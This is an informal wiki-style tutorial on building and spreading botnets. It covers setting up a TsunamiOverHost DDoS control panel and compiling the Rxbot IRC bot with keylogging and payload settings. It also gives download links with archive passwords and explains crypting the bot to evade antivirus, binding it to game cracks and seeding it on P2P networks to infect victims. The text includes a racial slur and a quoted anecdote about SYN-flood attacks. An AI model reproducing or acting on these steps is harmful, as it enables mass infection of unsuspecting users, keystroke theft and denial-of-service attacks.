
# How to Make a Botnet  #

The information on this page is provided for educational purposes only. The actual practices this page describes are illegal in most countries, and will violate most hosts' terms of service. If you actually intend to do any of these things, you should probably set up your own server, retain a good lawyer, and buy some anal lube for when you get sent to prison. Anonymous who ever the fuck is hosting this wiki, and the article authors are not responsible for your own stupidity.

# Making your own Botnet #

With this tool you can create own botnet and attack in 3 types of attacks:
       * UDP
       * ICMP
       * HTTP 
This paper and the software has been made for educational purposes only, the author will not take any responsibilities of you using TsunamiOverHost application.
First of all if you want to be successful on using this bot read this how-to carefully.
Fuck that tsunami overhost bullshit just download any noob ass sdbot rbot or if your really a skid try one of those mirc bots.
About the anal lube part only and a good lawyer is pure bullshit because if you dont run your mouth and proxy yourself behind some of your zombiez you can easily hide your ip but remember nerds in the community are quick to rat you out so if you plan to run a botnet keep it low and if you plan to ddos dont make it obvious and talk shit on someones board and then ddos. Just ddos it!

# Things that you need #

       *  The Program
             o TsunamiOverHost.exe
             o 4 files in one folder
                   + index.php
                   + online.php
                   + update.php
                   + update.txt 
       * A Host (You will only need ~10KB.)
             o MySQL or some other database management system where you'll create a special "botnet" table. 

# Uploading #

Ok, now you know what you need, and what you should have, lets get to the real business ; - )
      1. Create a folder.
      2. Copy index.php, online.php, update.php, update.txt.
      3. Paste it to the folder that you made.
      4. Open index.php with some text editor, and where it says: SETTINGS FOR ADMIN ACCESS Put your login and the pass, etc.
            1. $login = "yourLogin";
            2. $password = "yourPassword"; 
      5. Save.
      6. Go to your mysql database.
      7. Create a new database.
      8. Create a new table, for example open the sql manager and paste this : CREATE TABLE botnet ( date int NOT NULL, ip varchar(40) NOT NULL, b_id int unsigned primary key NOT NULL auto_increment);
      9. Save it.
     10. Open your online.php file, and look for "Set MySQL database variables" Change the following variables:
            1. $online_db_host = "yourHost ( ex . mysql.domain.com )";
            2. $online_db_name = "yourDatabaseName ( ex . haxior )";
            3. $online_db_user = "yourUser ( user for the database ) ";
            4. $online_db_pass = "yourPass ( password to the database )"; 
     11. Save. 
Now in your folder you should have two updated and two old files.
      1. Connect to your ftp ( ex . using flashfxp )
      2. Copy the folder that you have made to your host.
      3. Change the CHMOD's of file update.txt to 777.
      4. Disconnect. 
After setting everything up, you will open TsunamiOverHost.exe, and give the path to the folder that you just updated to your ftp. ( ex . domain.com/panel )
If everything goes fine, you will find a new file called server.exe. This file will be responsible for the power of the bot, More people open it = the bot will be more powerfull. In the panel, you will be able to see how many server.exe files are running on other peoples computers!
Yes! Lets have some fun ; >
      1. Go to your panel ( the one you uploaded through ftp, ex. domain.com/panel. )
      2. Login. 
I don't think i have to explain anything now, but remember the author will not take any responsibilities of the results!
Update: Most hosts won't let you run Tsunami off of it. Your best bet is to get WAMP (<http://www.wampserver.com/en/download.php)> and run the host off your own computer. 

# Download #

<http://www.anonym.to/?http://dump.no/files/1516f47bf628/TsunamiOverHost.zip> password: thrax  [Dead]
<http://www.anonym.to/?http://rapidshare.com/files/90295675/TsunamiOverHost.rar> password: tsunamirlz
<http://sharebee.com/85f28075> password:partyvan.info
needs more links please If you really need it that bad here it is. But becareful this is not just for "jokes" and you will be sued up the ass. - Norton Detects as Trojan - (stupid ass u cant hack or nuthin, I GOT NORTON)

## IRC Botnet ##

**Requirements :**
1) Microsoft Visual C++ 6.0  -> [http://anonym.to/?http://www.megaupload.com/?d=SUHPYZRX](/http://anonym.to/?http://www.megaupload.com/?d=SUHPYZRX)
2) Service Pack 6 for Visual C++ 6.0 [http://anonym.to/?http://www.microsoft.com/Downloads/details.aspx?displaylang=en&FamilyID=a8494edb-2e89-4676-a16a-5c5477cb9713](/http://anonym.to/?http://www.microsoft.com/Downloads/details.aspx?displaylang=en&FamilyID=a8494edb-2e89-4676-a16a-5c5477cb9713)
2) PSDK-x86 [http://anonym.to/?http://rapidshare.com/files/90492188/PSDK-x86_ByJxZGazY-P2P.rar](/http://anonym.to/?http://rapidshare.com/files/90492188/PSDK-x86_ByJxZGazY-P2P.rar)
3) Rxbot source code [http://anonym.to/http://www.mediafire.com/?zsyiiqlqnxw](/http://anonym.to/http://www.mediafire.com/?zsyiiqlqnxw)<- DEAD
Rar passwords: itzforblitz
Steps :
**1)Install Visual C++ 6.0 and its service pack**
**2) Once installed, configure the motherfucker :**

* In tools>options , go to DIRECTORIES tab, and click on the first icon that is on the left of the red cross.

* In SHOW DIRECTORIES FOR, select INCLUDE FILES

* Now, browse to the INCLUDE folder that PSDK-X86 installed (i.e : in my box, its at C:\Program files\Microsoft Platform SDK\Include)and select it. Remember to use the arrows to place it at the top of the list.
<http://img525.imageshack.us/img525/656/clipimage004ri7.gif>
      Now, in SHOW DIRECTORIES, select Library Files and Source Files, and in both cases, select where library
    and source files are located at (again, i.e : C:\Program files\MICROSOFT PLATFORM SDK\LIB and C:\Program files\MICROSOFT PLATFORM SDK\SRC)
<http://img519.imageshack.us/img519/6382/clipimage005ae0.gif>
     Click Ok.
**3) Configuring Rxbot**
    File>Open Workspace, and select the folder where Rxbot source code is at.
    Find the CONFIGS.S file (might be in "headers" folder, or not, it depends on the Rxbot version) , and at your right, you will see all of its parameters ; this is were you are going to edit it as you prefer.
    <http://bp3.blogger.com/_QKWgCjfqXOU/R7PA6UYpWUI/AAAAAAAAAZI/MHkYip727qM/s400/clipimage011vk8.jpg>
    **CONFIG.S PARAMETERS **
char botid[] = “”;                 // bot id
char version[] = “”;                 // Bots !version reply
char password[] = “”;              // bot password
char server[] = “”;                  // serverchar serve
rpass[] = “”;                           // server password
char channel[] = “”;               // channel that the bot should join
char chanpass[] = “”;              // channel password
char server2[] = “”;               // backup server (optional)
char channel2[] = “”;              // backup channel (optional)
char chanpass2[] = “”;             // backup channel password (optional)
char filename[] = “bling.exe”;  // DO NOT CHANGE THIS!!
char keylogfile[] = “”;               // keylog filename
char valuename[] = “”;            // value name for autostart
char nickconst[] = “”;              // first part to the bot’s nick
char szLocalPayloadFile[]=”";    // Payload filename
char modeonconn[] = “”;          // Can be more than one mode and contain both + and -
char exploitchan[] = “”;     // Channel where exploit messages get redirected
char keylogchan[] = “”;            // Channel where keylog messages get redirected
char psniffchan[] = “”;
**EXAMPLE OF HOW IT COULD LOOK LIKE AFTER BEING CONFIGURED :**
char botid[] = “DiE”;                              // bot id
char version[] = “[rxBot v0.6.6a “;                     // Bots !version reply
char password[] = “fucku”;                       // bot password
char server[] = “irc.server.net”;                    // server
char serverpass[] = “”;                            // server password
char channel[] = “#peruvian”;                      // channel that the bot should join
char chanpass[] = “”;                            // channel password
char server2[] = “”;                              // backup server (optional)
char channel2[] = “”;                              // backup channel (optional)
char chanpass2[] = “”;                               // backup channel password (optional)
char filename[] = “bling.exe”;                           // DO NOT CHANGE THIS!
char keylogfile[] = “system.txt”;                   // keylog filename
char valuename[] = “Microsoft Update Machine”;   // value name for autostart
char nickconst[] = “[Rlz]-”;                           // first part to the bot’s nick
char szLocalPayloadFile[]=”msconfig.dat”;          // Payload filename
char modeonconn[] = “+n+U”;                    // Can be more than one mode and contain both + and -char exploit
chan[] = “#peruvian “;                                   // Channel where exploit messages get redirected
char keylogchan[] = “#peruvian “;                   // Channel where keylog messages get redirected
char psniffchan[] = “#peruvian “;
**4) COMPILE! Go to Build>Rebuild All.. If you did it right, then it should say Rbot.exe - 0 errors, 0 warnings.**
<http://bp2.blogger.com/_QKWgCjfqXOU/R7PArEYpWTI/AAAAAAAAAZA/6fKtJ8XpmgI/s400/clipimage009io3.jpg>
**5) Your rbot.exe is, by default, in the RELEASE folder.. windows+F if you are stupid enough not to find it.**
**6) Making it stealth : **
If you got to this point, it means that you have your irc server and bot ready to rumble... But there are 2 problems :
1) AVs will detect it
2) By itself, it only executes the code in the background, so your victims will be suspicious.
**So, you should do 2 things :**
1) make it stealth with a crypter or
2) Bind it to another executable or
3)All of the above.
Long story short : download TYV CRYPTER (or the crypter of your choice) [http://anonym.to/?http://www.megaupload.com/?d=DH6XX69O](/http://anonym.to/?http://www.megaupload.com/?d=DH6XX69O)
- rar password : troyanosvirus.com.ar
go to www.novirusthanks.org and run a scan on your rbot.exe, and you will see that almost 24/24 Avs will detect it.
Now cript your rbot.exe, upload it again to novirusthanks.org, and you will see that half or less than half of AVs detect it.. You can do this with any crypter (the newer, the less detected the bot executable will be after encrypted)
Ok, rbot.exe is crypted. Now, we have got to bind it to another executable file, so when some dumbass nigger executes whatever the hell it is that you attached the bot to, the bot will run silently in the background ñ_ñ

* Advanced File Joiner v1.0 : [http://anonym.to/?http://www.megaupload.com/?d=HO4OCJQ1](/http://anonym.to/?http://www.megaupload.com/?d=HO4OCJQ1)
1)Bind it to a game crack or a new game`s setup.exe (dunno, use ur imagination)
2)Upload it to emule, ares, torrent, etc to get the infection going.
3)????
4)profit!

# Lulzy #

{{quote|Hello all!
A month ago this website I use was down for a few days. The owner contacted us saying they were "DDoSed". I knew nothing about the term so I googled it and read, and read and read and read. I became very interested and wanted to try "DoSing" someone myself, knowing one person can't do anything I figured 'hey, what's the harm?' So I downloaded a port scanner, and udp/syn/http flooder. I was very sure one person can't do anything to a website without a botnet or a group of people DoSing at the same time, but I was interested nonetheless. I figured I wouldn't be able to down a website but maybe bring a friend offline - I told him what I was going to do and he gave me his IP and I took a shot at it, failed. I knew I needed more people. That was the end of it for me, I forgot all about this and moved on with my life.
On monday, I was minding my own business on IRC and someone spoke of DoSing and I told him everything I knew because the guy was clueless lol, he had spoken of which port to attack with his SYN flooder to down a website and I told him it was wasting his time without a botnet. He obviously replied "HOW CAN I BOTNET LOL!" I told him a botnet was out of reach for him (I am sure they have to be created, not downloaded). So 20 minutes later someone I know and don't really like messaged me saying "botnets are possible faggot" and boom, I was offline. I netstat'd and I had a bunch of incoming SYN requests. I was being SYN flooded. So I got offline for a few hours. I was angrier than I'd ever been. I told some friends and they linked me this:
<http://partyvan.info/index.php/Botnet>
I did EVERYTHING that guide asked, and at the VERY end. TsunamiOverHost.exe wouldn't work. Scratch what I said earlier about being the angriest, NOW I was angry.| - x1mpr0x RAAAAAAAAGIN}}.
{{tutorials}}
